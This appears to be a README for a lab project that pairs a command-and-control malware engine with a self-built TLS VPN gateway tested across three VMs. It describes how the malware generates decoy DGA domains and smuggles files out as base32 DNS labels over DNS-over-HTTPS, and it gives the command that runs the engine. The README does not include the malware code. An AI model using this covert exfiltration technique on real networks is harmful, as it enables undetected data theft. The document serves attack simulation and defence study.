# BlindSpot-C2

A breach-and-mitigation simulation combining a real-world C2 malware engine with a defensive TLS VPN gateway. The malware side uses DGA and DNS-over-HTTPS tunneling (MITRE ATT&CK T1568.002, T1071.004, T1572) to communicate with a C2 server while evading detection. The defensive side isolates the victim behind a custom TLS-over-TCP VPN built from scratch using Linux TUN devices, a self-signed CA, and mutual TLS.

Built and tested across three virtual machines.

---
## Project Structure

```
BlindSpot-C2/
├── BlindSpot-C2.py # Malware engine: DGA domain generation + DoH C2 discovery + data tunneling
├── vpnserver.py # VPN gateway: TUN interface, TLS server, packet forwarding
└── vpnclient.py # VPN client: TUN interface, TLS client, connects to gateway
```


---

## How It Works

### Offensive Side: BlindSpot-C2.py

The malware generates a list of random-looking domains using a DGA (wordlist-based, randomized TLD), hides the real C2 domain among them, then resolves each one via Cloudflare's DoH resolver (`https://cloudflare-dns.com/dns-query`). Because the DNS queries are wrapped in HTTPS, they blend into normal web traffic and bypass traditional DNS inspection.

Once the C2 domain is found, the malware tunnels data to it by base32-encoding the payload, splitting it into 63-character chunks, and encoding each chunk as a DNS label in a query effectively exfiltrating data over DoH.

**MITRE ATT&CK mapping:**
- T1568.002 — Dynamic Resolution: Domain Generation Algorithms
- T1071.004 — Application Layer Protocol: DNS
- T1572 — Protocol Tunneling (DoH)

###  Defensive Side: VPN Gateway

The server and client each create a Linux TUN interface, establish a TCP connection, and wrap it in TLS. All IP packets written to the TUN device on one end are encrypted and forwarded to the other end, then written to its TUN device creating a full encrypted tunnel. The internal host sits behind the gateway with no public route, so the malware's C2 path collapses even if it executes.

Packets are length-prefixed (2-byte header) before sending, so the stream can be reliably reassembled on the other side.

---

## VM Network Setup

The project was tested across three VMs:

| VM | Role | Interface | IP |
|---|---|---|---|
| VPN Client | Attacker / external | NAT Network | 10.0.2.4 |
| VPN Server | Gateway | NAT Network | 10.0.2.15 |
| VPN Server | Gateway (internal) | Internal Network | 192.168.60.1 |
| Host V | Internal victim | Internal Network | 192.168.60.101 |

The client cannot reach Host V before the tunnel is up.

---

## Requirements


```bash
pip install requests
```

The VPN components use only Python standard library (`ssl`, `socket`, `fcntl`, `struct`, `select`). Root privileges are required for TUN device access.

### CA and Certificates

Generate a self-signed CA and issue server/client certificates before running the VPN:

```bash
# CA
openssl genrsa -out ca-private.pem 4096
openssl req -new -x509 -key ca-private.pem -out ca-public.pem -days 365

# Server cert
openssl genrsa -out server-private.pem 2048
openssl req -new -key server-private.pem -out server.csr
openssl x509 -req -in server.csr -CA ca-public.pem -CAkey ca-private.pem -CAcreateserial -out server-cert.pem -days 365

# Client cert (for mutual TLS)
openssl genrsa -out client-private.pem 2048
openssl req -new -key client-private.pem -out client.csr
openssl x509 -req -in client.csr -CA ca-public.pem -CAkey ca-private.pem -CAcreateserial -out client-cert.pem -days 365
```

---

## Usage

### VPN Server (run on gateway VM)

```bash
sudo python3 vpnserver.py \
  --server-cert server-cert.pem \
  --server-private server-private.pem \
  --ca-public ca-public.pem \
  --tun-ip 192.168.53.1 \
  --port 55555
```

### VPN Client (run on client VM)

```bash
sudo python3 vpnclient.py \
  --server-ip 10.0.2.15 \
  --client-cert client-cert.pem \
  --client-private client-private.pem \
  --ca-public ca-public.pem \
  --tun-ip 192.168.53.2 \
  --port 55555
```

After the tunnel is up, add a route on the client to reach the internal network through it:

```bash
sudo route add -net 192.168.60.0/24 dev tun0
```

### BlindSpot-C2 Malware Engine

```bash
python3 BlindSpot-C2.py \
  -w words.txt \
  -c 20 \
  -d example.com \
  --data "Hello, C2!"
```

| Flag | Description |
|---|---|
| `-w` | Path to wordlist for DGA domain generation |
| `-c` | Number of fake decoy domains to generate |
| `-d` | Real C2 domain (or URL with path) |
| `--data` | String payload to tunnel via DoH |
| `--file` | File to tunnel (overrides `--data`) |
| `--qtype` | DNS record type: A, AAAA, TXT, CNAME (default: A) |
| `--jitter` | Add random delay between DoH queries |

---

## Notes

- The VPN is built from scratch without any VPN libraries. TUN device creation, TLS handshake, and length-prefixed TCP framing are all implemented manually.
- Mutual TLS is optional but recommended: pass `--ca-public` on both server and client to require and verify client certificates.

---

## License

MIT
